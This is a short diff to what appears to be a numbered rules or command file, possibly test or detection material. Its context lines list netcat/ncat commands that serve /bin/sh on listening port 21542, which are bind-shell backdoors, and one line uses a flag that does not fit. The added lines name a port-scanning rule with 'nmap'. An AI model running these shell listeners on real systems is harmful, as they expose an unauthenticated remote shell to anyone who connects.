@@ -17,3 +17,6 @@ ncat --sh-exec /bin/sh -lvp 21542 &
 ncat --exec /bin/sh -lvp 21542 &
 nc -e /bin/sh -lvp 21542 &
 nc -s /bin/sh -lvp 21542 &
+
+#4.rule:Run the tool for scanning ports
+nmap
